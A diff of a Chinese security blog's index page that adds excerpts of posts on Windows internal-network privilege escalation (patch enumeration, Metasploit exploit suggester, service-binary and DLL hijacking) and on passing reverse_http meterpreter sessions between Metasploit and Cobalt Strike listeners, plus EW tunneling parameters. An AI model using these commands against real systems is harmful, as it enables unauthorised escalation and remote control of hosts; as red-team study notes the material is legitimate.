@@ -134,6 +134,116 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/04/16/内网提权方法/" >Windows内网提权</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Windows内网提权"><a href="#Windows内网提权" class="headerlink" title="Windows内网提权"></a>Windows内网提权</h1><p>内网权限：User-&gt;Administrator-&gt;System-&gt;TrustedInstaller<br>纵向提权：Webshell-&gt;管理员<br>横向提权：同级别角色权限之间相互Jump</p>
+<h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul>
+<li> 发现系统缺失补丁</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			#查看当前权限</span><br><span class="line">systeminfo					#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches		#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester		#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li>
+</ul>
+<h2 id="Windows操作系统配置错误利用"><a href="#Windows操作系统配置错误利用" class="headerlink" title="Windows操作系统配置错误利用"></a>Windows操作系统配置错误利用</h2><p>管理员凭据配置错误、服务器配置错误、故意削弱的安全措施、用户权限过高</p>
+<h3 id="服务器系统权限配置错误"><a href="#服务器系统权限配置错误" class="headerlink" title="服务器系统权限配置错误"></a>服务器系统权限配置错误</h3><p>一个低权限用户对于此类系统服务调用的可执行文件拥有写权限，可替换该文件为仍以可执行文件，并随着系统服务的启动获得系统权限<br>两种场景：1. 服务未运行：使用任意服务替换原来服务，然后重启服务。2. 服务正在运行且无法被终止：利用DLL劫持技术并尝试重启服务来进行提权</p>
+	
+
+	</div>
+  <a type="button" href="/2021/04/16/内网提权方法/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Windows内网提权"><a href="#Windows内网提权" class="headerlink" title="Windows内网提权"></a>Windows内网提权</h1><p>内网权限：User-&gt;Administrator-&gt;System-&gt;TrustedInstaller<br>纵向提权：Webshell-&gt;管理员<br>横向提权：同级别角色权限之间相互Jump</p>
+<h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul>
+<li> 发现系统缺失补丁</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			#查看当前权限</span><br><span class="line">systeminfo					#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches		#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester		#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li>
+</ul>
+<h2 id="Windows操作系统配置错误利用"><a href="#Windows操作系统配置错误利用" class="headerlink" title="Windows操作系统配置错误利用"></a>Windows操作系统配置错误利用</h2><p>管理员凭据配置错误、服务器配置错误、故意削弱的安全措施、用户权限过高</p>
+<h3 id="服务器系统权限配置错误"><a href="#服务器系统权限配置错误" class="headerlink" title="服务器系统权限配置错误"></a>服务器系统权限配置错误</h3><p>一个低权限用户对于此类系统服务调用的可执行文件拥有写权限，可替换该文件为仍以可执行文件，并随着系统服务的启动获得系统权限<br>两种场景：1. 服务未运行：使用任意服务替换原来服务，然后重启服务。2. 服务正在运行且无法被终止：利用DLL劫持技术并尝试重启服务来进行提权</p>
+	
+	</div>
+  <a type="button" href="/2021/04/16/内网提权方法/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/04/16/MSF与CS相互派生/" >MSF与CS相互派生</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="MSF派生至CS"><a href="#MSF派生至CS" class="headerlink" title="MSF派生至CS"></a>MSF派生至CS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">background				#将meterpreter shell在后台挂起</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject			#使用模块外联</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http		#选用的payload一定要跟cs下监听的payload方式一样，注意32位和64位</span><br><span class="line">set DisablePayloadHandler true								#禁止产生一个新的handler</span><br><span class="line">set LHOST IP																	#ip为cs监听会话用的ip</span><br><span class="line">set LPORT Port																#端口为cs对应的接受反弹shell的端口</span><br><span class="line">set pid 进程号																	#设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限，也可以不手动选择进程号</span><br><span class="line">set session 1																	#设置需要派送的meterpreter shell</span><br><span class="line">exploit																				#执行</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">制作一个普通http监听就可以</span><br></pre></td></tr></table></figure>
+<h3 id="CS派生至MSF"><a href="#CS派生至MSF" class="headerlink" title="CS派生至MSF"></a>CS派生至MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS:</span><br><span class="line">Payload:Foreign HTTP\HTTPS</span><br><span class="line">HOST:MSF的地址</span><br><span class="line">PORT:MSF的端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http\https			#与CS相同</span><br><span class="line">set LHOST 本机地址</span><br><span class="line">set LPORT 本机设定ip</span><br><span class="line">exploit					#启动监听</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">在相关要派生的会话上选择派生，派生的监听器选择刚刚创建的CS监听器</span><br></pre></td></tr></table></figure>
+
+	
+
+	</div>
+  <a type="button" href="/2021/04/16/MSF与CS相互派生/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="MSF派生至CS"><a href="#MSF派生至CS" class="headerlink" title="MSF派生至CS"></a>MSF派生至CS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">background				#将meterpreter shell在后台挂起</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject			#使用模块外联</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http		#选用的payload一定要跟cs下监听的payload方式一样，注意32位和64位</span><br><span class="line">set DisablePayloadHandler true								#禁止产生一个新的handler</span><br><span class="line">set LHOST IP																	#ip为cs监听会话用的ip</span><br><span class="line">set LPORT Port																#端口为cs对应的接受反弹shell的端口</span><br><span class="line">set pid 进程号																	#设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限，也可以不手动选择进程号</span><br><span class="line">set session 1																	#设置需要派送的meterpreter shell</span><br><span class="line">exploit																				#执行</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">制作一个普通http监听就可以</span><br></pre></td></tr></table></figure>
+<h3 id="CS派生至MSF"><a href="#CS派生至MSF" class="headerlink" title="CS派生至MSF"></a>CS派生至MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS:</span><br><span class="line">Payload:Foreign HTTP\HTTPS</span><br><span class="line">HOST:MSF的地址</span><br><span class="line">PORT:MSF的端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http\https			#与CS相同</span><br><span class="line">set LHOST 本机地址</span><br><span class="line">set LPORT 本机设定ip</span><br><span class="line">exploit					#启动监听</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">在相关要派生的会话上选择派生，派生的监听器选择刚刚创建的CS监听器</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2021/04/16/MSF与CS相互派生/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/04/16/内网穿透/" >内网穿透</a>
 		</h3>
 		</div>
@@ -149,7 +259,7 @@
   <div class="row">
 	
 	
-		<p>#内网穿透<br>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p>
+		<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p>
 <h2 id="EW穿透"><a href="#EW穿透" class="headerlink" title="EW穿透"></a>EW穿透</h2><h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssocksd									#正向代理</span><br><span class="line">rcsocks,rssocks					#反向代理的客户端和服务端</span><br><span class="line">lcx_slave  							#该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran   							#该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen 							#该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">-l											#监听</span><br><span class="line">-s											#选择对应服务</span><br><span class="line">-d,-f										#指定对应ip</span><br><span class="line">-e,-g										#指定对应端口</span><br></pre></td></tr></table></figure>
 <h3 id="案例详解"><a href="#案例详解" class="headerlink" title="案例详解"></a>案例详解</h3><h4 id="一级网络环境"><a href="#一级网络环境" class="headerlink" title="一级网络环境"></a>一级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162335.png"></p>
 <ul>
@@ -178,7 +288,7 @@
   <div class="row">
 	
 	
-		<p>#内网穿透<br>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p>
+		<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p>
 <h2 id="EW穿透"><a href="#EW穿透" class="headerlink" title="EW穿透"></a>EW穿透</h2><h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssocksd									#正向代理</span><br><span class="line">rcsocks,rssocks					#反向代理的客户端和服务端</span><br><span class="line">lcx_slave  							#该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran   							#该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen 							#该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">-l											#监听</span><br><span class="line">-s											#选择对应服务</span><br><span class="line">-d,-f										#指定对应ip</span><br><span class="line">-e,-g										#指定对应端口</span><br></pre></td></tr></table></figure>
 <h3 id="案例详解"><a href="#案例详解" class="headerlink" title="案例详解"></a>案例详解</h3><h4 id="一级网络环境"><a href="#一级网络环境" class="headerlink" title="一级网络环境"></a>一级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162335.png"></p>
 <ul>
@@ -239,7 +349,7 @@
 		<h4>分类</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>1</span></a></li>
+			<li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>3</span></a></li>
 		
 		</ul>
 	</div>
@@ -250,7 +360,11 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/MSF与CS/">MSF与CS<span>1</span></a></li>
+		
 			<li><a href="/tags/内网穿透/">内网穿透<span>1</span></a></li>
+		
+			<li><a href="/tags/Windows内网提权/">Windows内网提权<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -262,6 +376,14 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/04/16/内网提权方法/" ><i class="fa fa-file-o"></i>Windows内网提权</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/16/MSF与CS相互派生/" ><i class="fa fa-file-o"></i>MSF与CS相互派生</a>
+      </li>
     
       <li>
         <a href="/2021/04/16/内网穿透/" ><i class="fa fa-file-o"></i>内网穿透</a>
